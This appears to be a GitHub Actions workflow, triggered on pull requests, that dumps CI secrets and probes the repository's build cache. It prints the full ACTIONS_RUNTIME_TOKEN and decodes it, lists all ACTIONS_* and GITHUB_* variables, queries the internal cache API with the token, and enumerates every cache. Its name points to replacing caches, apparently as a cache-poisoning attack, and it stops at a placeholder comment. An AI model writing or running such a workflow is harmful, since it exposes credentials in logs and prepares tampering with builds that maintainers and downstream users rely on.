name: Cache Nuke & Replace

on:
  pull_request:
  workflow_dispatch:

permissions:
  contents: read
  actions: write
  id-token: write  # Needed for OIDC token

env:
  GH_TOKEN: ${{ github.token }}

jobs:
  nuke-and-replace:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # ========================================
      # PRINT CACHE CREDENTIALS
      # ========================================
      - name: "🔑 Print Cache URL and Token"
        run: |
          echo "╔════════════════════════════════════════════════════════════════╗"
          echo "║                    CACHE CREDENTIALS                            ║"
          echo "╚════════════════════════════════════════════════════════════════╝"
          echo ""
          
          echo "=== ACTIONS_CACHE_URL ==="
          echo "$ACTIONS_CACHE_URL"
          echo ""
          
          echo "=== ACTIONS_RUNTIME_URL ==="
          echo "$ACTIONS_RUNTIME_URL"
          echo ""
          
          echo "=== ACTIONS_RUNTIME_TOKEN (first 100 chars) ==="
          echo "${ACTIONS_RUNTIME_TOKEN:0:100}..."
          echo ""
          
          echo "=== ACTIONS_RUNTIME_TOKEN (full - SENSITIVE!) ==="
          echo "$ACTIONS_RUNTIME_TOKEN"
          echo ""
          
          echo "=== Decode JWT Token (middle part) ==="
          echo "$ACTIONS_RUNTIME_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . || echo "Failed to decode"
          echo ""
          
          echo "=== OIDC Token Request URL ==="
          echo "URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
          echo "Token exists: $([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo 'YES' || echo 'NO')"
          echo ""
          
          echo "=== GitHub Context ==="
          echo "Ref: $GITHUB_REF"
          echo "Repository: $GITHUB_REPOSITORY"
          echo "Run ID: $GITHUB_RUN_ID"
          echo "Job: $GITHUB_JOB"
          echo ""
          
          echo "=== All ACTIONS_* Environment Variables ==="
          env | grep -E "^ACTIONS_" | sort
          echo ""
          
          echo "=== All GITHUB_* Environment Variables ==="
          env | grep -E "^GITHUB_" | sort

      - name: "🔍 Test Cache API Directly"
        run: |
          echo "=== Testing Cache API ==="
          
          # List caches via API
          echo "Listing caches via REST API:"
          curl -sS -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
            "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?keys=*" | jq . || echo "API call failed"
          
          echo ""
          echo "=== Cache API Endpoints ==="
          echo "Base URL: $ACTIONS_CACHE_URL"
          echo "List: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches"
          echo "Reserve: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches (POST)"
          echo "Upload: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches/{id} (PATCH)"
          echo "Commit: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches/{id} (POST)"

      - name: "🔍 List ALL caches"
        id: list-caches
        run: |
          echo "=== ALL CACHES IN REPO ==="
          gh cache list --repo ${{ github.repository }} --limit 100 --json id,key,ref,sizeInBytes
          
          # Save cache keys to file
          gh cache list --repo ${{ github.repository }} --limit 100 --json id,key \
            -q '.[] | "\(.id)|\(.key)"' > /tmp/caches.txt
          
          echo "Found caches:"
          cat /tmp/caches.txt
          
          # Count
          CACHE_COUNT=$(wc -l < /tmp/caches.txt | tr -d ' ')
          echo "cache-count=$CACHE_COUNT" >> $GITHUB_OUTPUT

      # ... rest of your workflow
